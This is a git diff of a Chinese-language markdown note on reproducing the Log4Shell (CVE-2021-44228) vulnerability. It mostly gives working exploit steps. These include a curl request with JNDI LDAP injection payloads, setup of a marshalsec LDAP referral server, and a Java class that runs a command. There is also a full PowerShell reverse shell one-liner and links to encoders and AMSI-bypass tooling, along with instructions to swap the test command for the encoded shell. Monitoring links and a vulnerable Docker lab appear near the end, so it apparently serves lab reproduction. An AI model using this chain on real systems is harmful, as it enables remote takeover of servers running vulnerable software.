@@ -8,8 +8,8 @@ https://github.com/YfryTchsGD/Log4jAttackSurface
 
 
 ## 复现
-https://www.youtube.com/watch?v=7qoPDq41xhQ
-CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)
+
+[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)
 
 ```bash
 https://github.com/leonjza/log4jpwn
@@ -21,8 +21,6 @@ nc -lnvp 8888
 curl -v -H 'User-Agent: ${jndi:ldap://172.17.0.1:8888/a}' 'localhost:8080/${jndi:ldap://172.17.0.1:8888/a}/?pwn=$\{jndi:ldap://172.17.0.1:8888/a\}'
 ```
 
-
-
 [marshalsec](https://github.com/mbechler/marshalsec)
 
 ```bash
@@ -30,6 +28,7 @@ git clone git@github.com:mbechler/marshalsec.git
 mvn clean package -DskipTests.
 
 # https://hub.docker.com/_/maven?tab=tags
+
 docker pull maven:3.8.4-openjdk-8
 
 # https://github.com/christophetd/log4shell-vulnerable-app/blob/main/Dockerfile
@@ -44,33 +43,45 @@ RUN mvn clean package -Dmaven.test.skip=true
 docker build -t marshalsec .
 nc -lnvp 9999
 ```
--Dmaven.test.skip=true
-mvn package -Dmaven.test.skip=true 
-maven跳过单元测试-maven.test.skip和skipTests的区别
-https://www.cnblogs.com/javabg/p/8026881.html
+
+[maven跳过单元测试-maven.test.skip和skipTests的区别](https://www.cnblogs.com/javabg/p/8026881.html)
 
 https://github.com/xiajun325/apache-log4j-rce-poc
+
+
+```bash
 git clone git@github.com:xiajun325/apache-log4j-rce-poc.git
+
 docker run -v `pwd`/:/root/poc  marshalsec javac /root/poc/src/main/java/Log4jRCE.java
+
+# https://www.cnblogs.com/mingforyou/p/3551199.html
 javac Log4jRCE.java
 php -S 127.0.0.1:8888
+
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
-Log4jRCE.java
+
+# vim Log4jRCE.java
 Runtion.getRuntime().exec("calc.exe")
 python3 -m http.server
+```
 
 ${jndi:ldap://xxx/Log4jRCE}
 
-powershell reverse shell one liner
-https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+反向
+
+[powershell reverse shell one liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
+
 ```powershell
 # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
 
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+
 https://raikia.com/tool-powershell-encoder/
-powershell encode raikou base64
-amsi.fail
+
+GOOGLE: powershell encode raikou base64
+
+https://amsi.fail
 
 再把calc.exe 代替成上面的编码shell
 
@@ -80,6 +91,7 @@ nc -lnvp 9898
 ### 在线测试端口
 
 https://log4shell.huntress.com/
+
 docker run 
 curl -H
 
@@ -100,15 +112,14 @@ https://www.minecraft.net
 https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition
 
 ### 影响监控
+
 https://www.greynoise.io/
 https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22
 https://gist.github.com/superducktoes/b642c6f5de4f19a3715675303e0d6357
 https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217
 
-
-
-
 ### docker 靶机
+
 https://github.com/christophetd/log4shell-vulnerable-app
 docker build . -t vulnerable-app
 docker run -p 8081:8080 --name vulnerable-app vulnerable-app
